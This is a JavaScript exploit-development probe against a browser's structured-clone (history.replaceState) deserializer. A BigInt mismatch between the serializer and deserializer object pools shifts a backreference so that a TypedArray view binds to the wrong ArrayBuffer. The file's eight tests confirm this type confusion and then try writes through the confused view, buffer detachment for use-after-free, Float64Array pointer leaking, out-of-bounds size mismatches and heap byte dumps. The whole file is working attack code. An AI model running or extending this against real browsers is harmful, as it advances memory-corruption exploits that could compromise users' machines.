// SC confusion probe v2 — using the CORRECT layout from the working same_size_confusion test
// Pattern: [BigInt, targetBuf, view1(sourceBuf), view2(sourceBuf), ...padding]
// BigInt is skipped in serializer pool but included in deserializer pool.
// view2's buffer backref shifts by 1, resolving to targetBuf instead of sourceBuf.
(function() {
'use strict';

var FILLER_PAD = 100;
var results = { tests: [] };

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.tests.push(r);
  } catch(e) {
    results.tests.push({ name: name, error: e.message });
  }
}

function buildConfusedClone(bigintCount, targetBuf, sourceBuf) {
  // Layout: [BigInt(s), targetBuf, view1(sourceBuf), view2(sourceBuf), ...padding]
  // view2.buffer backref → targetBuf (shifted by bigintCount)
  var v1 = new Uint8Array(sourceBuf);
  var v2 = new Uint8Array(sourceBuf);

  var filler = [];
  for (var i = 0; i < bigintCount; i++) filler.push(BigInt(i + 1));
  filler.push(targetBuf);
  filler.push(v1);
  filler.push(v2);
  while (filler.length < FILLER_PAD) filler.push({ pad: filler.length });

  var ref = {};
  var outer = new Array(FILLER_PAD + 3);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[FILLER_PAD + 2] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  return c;
}

// Test 1: Confirm same-size confusion and identify indices
test('confirm_confusion', function() {
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xAA);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0xBB);

  var c = buildConfusedClone(1, target, source);
  if (!c) return { result: 'null_state' };

  var f = c[0];
  // filler layout: [1n, target, v1(source), v2(source), ...padding]
  // In clone: [1n, target_clone, v1_clone, v2_confused, ...padding]
  // v2_confused.buffer should be target_clone (shifted backref)
  var v2 = f[3];
  if (!(v2 instanceof Uint8Array)) return { result: 'v2_not_u8', type: typeof v2, ctor: v2 && v2.constructor ? v2.constructor.name : '?' };

  var targetClone = f[1];
  if (!(targetClone instanceof ArrayBuffer)) return { result: 'target_not_ab', type: typeof targetClone };

  return {
    result: v2[0] === 0xAA ? 'CONFUSED' : (v2[0] === 0xBB ? 'not_confused' : 'unexpected_' + v2[0]),
    v2_byte0: v2[0],
    v2_len: v2.length,
    v2_bufLen: v2.buffer.byteLength,
    bufferShared: v2.buffer === targetClone
  };
});

// Test 2: Write through confused view, confirm we can modify the target buffer
test('write_through', function() {
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0x11);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0x22);

  var c = buildConfusedClone(1, target, source);
  if (!c) return { result: 'null_state' };

  var v2 = c[0][3];
  if (!(v2 instanceof Uint8Array)) return { result: 'not_u8' };
  if (v2[0] !== 0x11) return { result: 'not_confused', byte0: v2[0] };

  // Write through confused view
  v2[0] = 0xFF;
  v2[1] = 0xFE;

  // Read through the target buffer reference
  var targetView = new Uint8Array(c[0][1]);
  return {
    result: 'write_test',
    v2_reads_ff: v2[0] === 0xFF,
    target_reads_ff: targetView[0] === 0xFF,
    shared: v2.buffer === c[0][1],
    v2_byte0: v2[0],
    target_byte0: targetView[0]
  };
});

// Test 3: Try detach-after-confusion (use-after-free potential)
// If we transfer the target buffer, v2 might still have the dangling data pointer
test('detach_uaf', function() {
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xDD);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0xEE);

  var c = buildConfusedClone(1, target, source);
  if (!c) return { result: 'null_state' };

  var v2 = c[0][3];
  if (!(v2 instanceof Uint8Array)) return { result: 'not_u8' };
  if (v2[0] !== 0xDD) return { result: 'not_confused' };

  var targetBuf = c[0][1];
  var shared = v2.buffer === targetBuf;

  // Try various detach methods
  var detachResult = 'none';

  // Method 1: postMessage with transfer
  try {
    var mc = new MessageChannel();
    mc.port1.postMessage({}, [targetBuf]);
    mc.port1.close();
    mc.port2.close();
    detachResult = 'postMessage';
  } catch(e) {
    detachResult = 'postMessage_err:' + e.message.substring(0, 40);
  }

  // Check if buffer got detached
  var bufDetached = false;
  try { bufDetached = targetBuf.byteLength === 0; } catch(e) { bufDetached = true; }

  // Check if v2 still works
  var v2Works = false;
  var v2Byte = -1;
  try {
    v2Byte = v2[0];
    v2Works = v2Byte !== undefined;
  } catch(e) {
    v2Works = false;
  }

  // Check v2 buffer state
  var v2BufLen = -1;
  try { v2BufLen = v2.buffer.byteLength; } catch(e) {}
  var v2Len = -1;
  try { v2Len = v2.byteLength; } catch(e) {}

  return {
    result: 'detach_test',
    shared: shared,
    detachMethod: detachResult,
    bufDetached: bufDetached,
    v2Works: v2Works,
    v2Byte: v2Byte,
    v2BufLen: v2BufLen,
    v2Len: v2Len
  };
});

// Test 4: structuredClone with transfer
test('detach_structuredClone', function() {
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xCC);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0x33);

  var c = buildConfusedClone(1, target, source);
  if (!c) return { result: 'null_state' };

  var v2 = c[0][3];
  if (!(v2 instanceof Uint8Array)) return { result: 'not_u8' };
  if (v2[0] !== 0xCC) return { result: 'not_confused' };

  var targetBuf = c[0][1];

  // Try structuredClone transfer
  try {
    var cloned = structuredClone(targetBuf, { transfer: [targetBuf] });
    var bufDetached = targetBuf.byteLength === 0;
    var v2Byte = -1;
    try { v2Byte = v2[0]; } catch(e) {}
    var v2BufLen = -1;
    try { v2BufLen = v2.buffer.byteLength; } catch(e) {}

    return {
      result: 'structuredClone_test',
      clonedLen: cloned.byteLength,
      bufDetached: bufDetached,
      v2Byte: v2Byte,
      v2BufLen: v2BufLen,
      v2Detached: v2.byteLength === 0
    };
  } catch(e) {
    return { result: 'structuredClone_err', msg: e.message.substring(0, 60) };
  }
});

// Test 5: Different TypedArray types — Float64Array for pointer leaking
test('f64_confusion', function() {
  var target = new ArrayBuffer(64);
  var tv = new Uint8Array(target);
  // Write a recognizable 64-bit pattern at offset 0
  tv[0]=0x48; tv[1]=0x47; tv[2]=0x46; tv[3]=0x45;
  tv[4]=0x44; tv[5]=0x43; tv[6]=0x42; tv[7]=0x41;

  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0x00);
  // Need two views of source, but one is Float64Array
  var v1 = new Uint8Array(source); // first view
  var v2 = new Float64Array(source); // second view — gets the backref

  var filler = [];
  filler.push(1n);
  filler.push(target);
  filler.push(v1);
  filler.push(v2);
  while (filler.length < FILLER_PAD) filler.push({ pad: filler.length });

  var ref = {};
  var outer = new Array(FILLER_PAD + 3);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[FILLER_PAD + 2] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var cv = c[0][3];
  if (!cv) return { result: 'null_view' };
  if (!(cv instanceof Float64Array)) return { result: 'not_f64', type: typeof cv, ctor: cv.constructor ? cv.constructor.name : '?' };

  // Read the float64 value — if confused with target, first f64 should be our pattern
  var val = cv[0];
  // The bytes 41 42 43 44 45 46 47 48 as float64 (little-endian) = ?
  var dv = new DataView(new ArrayBuffer(8));
  dv.setUint8(0, 0x48); dv.setUint8(1, 0x47); dv.setUint8(2, 0x46); dv.setUint8(3, 0x45);
  dv.setUint8(4, 0x44); dv.setUint8(5, 0x43); dv.setUint8(6, 0x42); dv.setUint8(7, 0x41);
  var expected = dv.getFloat64(0, true);

  return {
    result: val === expected ? 'CONFUSED_F64' : 'data_mismatch',
    val0: val,
    expected: expected,
    len: cv.length,
    bufLen: cv.buffer.byteLength
  };
});

// Test 6: What if both views are Uint8Array but source != target size?
// Confirm deserializer rejects this
test('size_mismatch_rejection', function() {
  var target = new ArrayBuffer(16);
  new Uint8Array(target).fill(0xFF);
  var source = new ArrayBuffer(256);
  new Uint8Array(source).fill(0x00);

  var c = buildConfusedClone(1, target, source);
  if (!c) return { result: 'null_state' };

  var v2 = c[0][3];
  if (v2 === null || v2 === undefined) return { result: 'REJECTED_null', type: String(v2) };
  if (!(v2 instanceof Uint8Array)) return { result: 'REJECTED_wrong_type', type: typeof v2, ctor: v2.constructor ? v2.constructor.name : '?' };

  return {
    result: 'NOT_REJECTED',
    len: v2.length,
    bufLen: v2.buffer.byteLength,
    oob: v2.length > v2.buffer.byteLength
  };
});

// Test 7: What if source is SMALLER than target? View would be small on big buffer
test('reverse_size', function() {
  var target = new ArrayBuffer(256);
  new Uint8Array(target).fill(0xAA);
  var source = new ArrayBuffer(16);
  new Uint8Array(source).fill(0xBB);

  var c = buildConfusedClone(1, target, source);
  if (!c) return { result: 'null_state' };

  var v2 = c[0][3];
  if (v2 === null || v2 === undefined) return { result: 'null_view' };
  if (!(v2 instanceof Uint8Array)) return { result: 'not_u8', type: typeof v2 };

  return {
    result: v2[0] === 0xAA ? 'CONFUSED' : 'not_confused',
    len: v2.length,
    bufLen: v2.buffer.byteLength,
    byte0: v2[0]
  };
});

// Test 8: Heap scan — with same-size confusion, spray buffers and look for
// adjacent heap metadata via a controlled overlap
test('heap_probe', function() {
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0x41);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0x42);

  var c = buildConfusedClone(1, target, source);
  if (!c) return { result: 'null_state' };

  var v2 = c[0][3];
  if (!(v2 instanceof Uint8Array)) return { result: 'not_u8' };

  // Dump all 64 bytes as hex
  var hex = '';
  for (var i = 0; i < v2.length; i++) {
    hex += v2[i].toString(16).padStart(2, '0');
  }
  return {
    result: v2[0] === 0x41 ? 'CONFUSED' : 'not_confused',
    hex: hex
  };
});

return JSON.stringify(results);
})();
